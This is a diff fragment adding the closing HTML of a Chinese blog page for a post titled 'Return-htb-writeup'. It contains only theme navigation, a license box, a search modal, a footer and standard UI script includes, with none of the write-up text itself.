+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Return-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/08/Return-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/10/Sauna-htb-writeup/" title="Sauna-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Sauna-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/28/UpDown-htb-writeup/" title="UpDown-htb-writeup">
+                        <span class="hidden-mobile">UpDown-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
